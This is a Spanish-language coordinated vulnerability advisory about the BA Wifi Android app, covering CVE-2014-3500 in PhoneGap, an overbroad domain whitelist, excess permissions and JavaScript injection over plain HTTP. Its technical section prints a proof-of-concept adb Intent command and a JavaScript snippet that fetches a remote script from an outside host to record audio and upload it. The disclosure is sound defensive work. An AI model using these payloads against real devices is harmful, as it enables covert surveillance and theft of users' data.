
# Vulnerabilidades en BA Wifi para Android


## 1. Información del reporte

**Título:** Vulnerabilidades en BA Wifi para Android

**Reporte ID:** STIC-2015-0115

**Reporte URL:** [http://www.fundacionsadosky.org.ar/publicaciones/#seguridad-en-tic](http://www.fundacionsadosky.org.ar/publicaciones/#seguridad-en-tic)

**Fecha de publicación:** 2015-03-01

**Fecha de última actualización:** 2015-11-26

**Fabricantes contactados:** Gobierno de la Ciudad de Buenos Aires

**Modo de publicación:** Coordinado



## 2. Información de vulnerabilidades

**Clase:** Inyección de código [[http://cwe.mitre.org/data/definitions/94.html](http://cwe.mitre.org/data/definitions/94.html)]

**Impacto:** Perdida de datos

**Remotamente explotable:** Si

**Localmente explotable:** Si

**Identificador CVE:** N/A



## 3. Descripción de vulnerabilidad

La aplicación para Android BA Wifi [1] del Gobierno de La Ciudad de Buenos Aires, permite localizar las conexiones Wifi libres del Gobierno de la Ciudad por comunas, por puntos de interés o por ubicación. Según estadística del mercado de aplicaciones Google Play, a febrero de 2015 fue instalada entre 10.000 y 50.000 veces.
 
La aplicación fue desarrollada usando Apache Cordova[2] (conocido también como PhoneGap), un framework de código abierto que permite construir aplicaciones para dispositivos móviles a partir de tecnología web standard. El framewok embebe en la aplicación móvil un motor de navegador web (conocido como WebView) adaptado a la características del dispositivo, para que el usuario pueda visualizar el contenido de una aplicación web. Este mecanismo permite a un desarrollador incorporar a dispositivos móviles, rápidamente y con poco esfuerzo de adaptación, aplicaciones web ya existentes o desarrolladas para otras plataformas.
 
El framework utilizado por la aplicación utiliza de WebView customizados para que un usuario pueda visualizar su contenido web. El problema de estas vistas es que para aumentar la usabilidad de la aplicación, se rompe el sandbox de un browser habitual, permitiendo que un script dentro del contenido interactúe con componentes del sistema. El framework de Cordova permite correr código Java embebido a través de interfaces definidas por el mismo. Debido al _target-SDK_ de BA WiFi, en dispositivos con versiones anteriores a 4.4.4, Javascript malicioso inyectado puede llegar a correr código nativo arbitrariamente. Debido a que la aplicación posee más permisos de los necesarios (grabar audio y video, capturar fotos, recibir SMS, leer y escribir contactos y en la memoria externa), Javascript malicioso podría a llegar a realizar cualquiera utilizar estas funcionalidades, sin importar la versión de Android del dispositivo.
 
Como la aplicación intenta obtener las direcciones desde la ubicación actual del dispositivo a las de las redes abiertas de forma insegura, es posible inyectar Javascript malicioso por cualquier atacante en la red conectada o que se encuentre en la ruta al servidor.  
 
La configuración utilizada de Apache Cordova/PhoneGap es también insegura. Permite a la aplicación conectarse a cualquier dominio y no solo al dominio donde se encuentra el servidor, esto permite al atacante forzar a la aplicación a acceder a un servidor remoto posiblemente malicioso. La segunda razón, es que expone todos los plugin que permiten acceder a un recurso del celular desde Javascript. La aplicación debería sólo aquellos plugins que son necesitados para su correcto funcionamiento, en este caso geolocalización y acceso a internet. 


## 4. Paquetes vulnerables

* Dispositivos corriendo la versión 1.1 o versiones anteriores.

## 5. Información y soluciones del fabricante
 
 El fabricante actualizó la aplicación el 10 de abril de 2015 y la versión 2.0 soluciona los problemas mencionados.


## 6. Créditos

Las vulnerabilidades fueron descubiertas e investigadas por Joaquín Rinaudo. La publicación de este reporte fue coordinada por Programa Seguridad en TIC. 

## 7. Descripción técnica

BA Wifi utiliza la versión de PhoneGap 2.3.0 que es vulnerable a CVE-2014-3500 [3] permitiendole a otras aplicaciones cambiar la página de inicio de la aplicación por una con contenido malicioso a través de un Intent que lleve un parámetro extra con referencia al contenido bajo la clave _url_. 
  
La correcta configuración del framework podría llegar a bloquear dicho ataque cuando se restringen los dominios a los cuales la aplicación se puede conectar a través del archivo de configuración _res/xml/config.xml_. Sin embargo, BA Wifi permite a la aplicación acceder a cualquier dominio dado a que para filtrar los accesos utiliza un comodín.
  
Dentro de este archivo de configuración se encuentran también listados los plugins del framework de PhoneGap utilizados. Muchos de estos plugins incluidos en BA Wifi no son necesarios para su funcionamiento. Por ejemplo, _Media_ permite reproducir y grabar audio desde Javascript.  _ContactManager_ permite el manejo de los contactos del dispositivo y _Capture_ permite capturar fotos y videos. Ninguno de estos módulos son  utilizado por BA Wifi pero permitirían que atacantes que lleguen a comprometer la aplicación puedan utilizarlos. Además de incluir estos plugins, la aplicación necesita pedir los permisos necesarios de Android para poder utilizar estos recursos. Sucede que BA Wifi es una aplicación sobreprivilegiada, es decir, requiere más permisos de los que utiliza. Para poder ser instalada, un usuario tiene que permitir el acceso a la aplicación a sus contactos, a la cámara, permitir grabar audio y video, recibir SMS, leer y escribir en la memoria externa además de los permisos que si podrían son utilizados como acceso a su ubicación e internet.  
  
Como prueba de concepto que la aplicación es vulnerable a CVE-2014-3500 se puede enviar el siguiente comando a través de adb (Android Debug Bridge) que simularía ser una aplicación que envía un Intent malicioso que inyecta Javascript utilizando el módulo _Media_[4] logrando capturar audio.

_ adb shell am start -n ar.gob.ba.bawifi/.bawifi --es url "https://googledrive.com/host/0B0f57xoYl_BFOG5FMEhpc3AzckU/testing.html"_
BA Wifi intenta obtener el recorrido a los lugares donde hay redes abierta a partir de la ubicación del dispositivo. Para ello, se envía un pedido HTTP a _http://recorridos.usig.buenosaires.gob.ar/2.0/consultar_recorrido_. Este pedido devuelve un Javascript (originalmente un Callback) que se corre en un contexto de un iframe dentro de la ventana principal de la aplicación. Dado a que el pedido se realiza mediante transporte inseguro, atacantes podrían realizar Man-in-the-Middle e inyectar su propio Javascript. Nuevamente, dado a que Phonegap utiliza interfaces que conectan Java con Javascript, es posible acceder a información privada del usuario a través de estas inyecciones de código. Por ejemplo, el siguiente código inyectado al pedido permite grabar audio y subirlo a un servidor malicioso. Este inyecta al documento del padre con un tag de _script_ similar al del ejemplo anterior. 

```
    function loadjsfile(filename){

    var xhrObj = new XMLHttpRequest();
    // open and send a synchronous request
    xhrObj.open('GET', filename, false);
    xhrObj.send('');
    // add the returned content to a newly created script tag
    var se = document.createElement('script');
    se.type = "text/javascript";
    se.charset = "UTF-8";
    se.text = xhrObj.responseText;
    alert(xhrObj.responseText);

    parent.document.getElementsByTagName('head')[0].appendChild(se);
 
    }

    loadjsfile("http://yourjavascript.com/1212011542/cordova-record-and-upload.js"); 


```

Por último, inyectar código Javascript permitiría ejecutar código arbitrariamente en dispositivos con versiones corriendo anteriores a la 4.4.4 dado que la aplicación cuenta un _targetSDK_ menor a 17 lo permite que se pueda utilizar Java Reflection para acceder a otras clases que no sean la expuesta a través de la interface con _addJavascriptInterface_. A partir de la versión 4.4.4, el motor que implementa Webview bloquea el uso de Java Reflection [5].


## 8. Cronología del reporte

* **2015-04-10:** 
          Se publica una actualización que soluciona los problemas mencionados.
        
* **2015-11-26:** 
          Se publica el reporte de seguridad.
        

## 9. Referencias

[1] [https://play.google.com/store/apps/details?id=ar.gob.ba.bawifi](https://play.google.com/store/apps/details?id=ar.gob.ba.bawifi)

[2] [http://cordova.apache.org](http://cordova.apache.org)

[3] [https://web.nvd.nist.gov/view/vuln/detail?vulnId=CVE-2014-3500 ](https://web.nvd.nist.gov/view/vuln/detail?vulnId=CVE-2014-3500 )

[4] [http://docs.phonegap.com/en/edge/cordova_media_media.md.html](http://docs.phonegap.com/en/edge/cordova_media_media.md.html)

[5] [https://code.google.com/p/chromium/issues/detail?id=359528 ](https://code.google.com/p/chromium/issues/detail?id=359528 )

## 10. Acerca Fundación Dr. Manuel Sadosky

La Fundación Dr. Manuel Sadosky es una institución público privada cuyo objetivo es favorecer la articulación entre el sistema científico – tecnológico y la estructura productiva en todo lo referido a la temática de las Tecnologías de la Información y la Comunicación (TIC). Creada a través del Decreto Nro. 678/09 del Poder Ejecutivo Nacional, la Fundación es presidida por el ministro de Ciencia, Tecnología e Innovación Productiva. Sus vicepresidentes son los presidentes de las cámaras más importantes del sector TIC: CESSI (Cámara de Empresas de Software y Servicios Informáticos) y CICOMRA (Cámara de Informática y Comunicaciones de la República Argentina). Para más información visitar: [http://www.fundacionsadosky.org.ar](http://www.fundacionsadosky.org.ar)

## 11. Derechos de autor

El contenido de este reporte tiene copyright (c) 2014 Fundación Sadosky y se publica bajo la licencia Creative Commons Attribution Non-Commercial Share-Alike 4.0: [http://creativecommons.org/licenses/by-nc-sa/4.0/](http://creativecommons.org/licenses/by-nc-sa/4.0/)
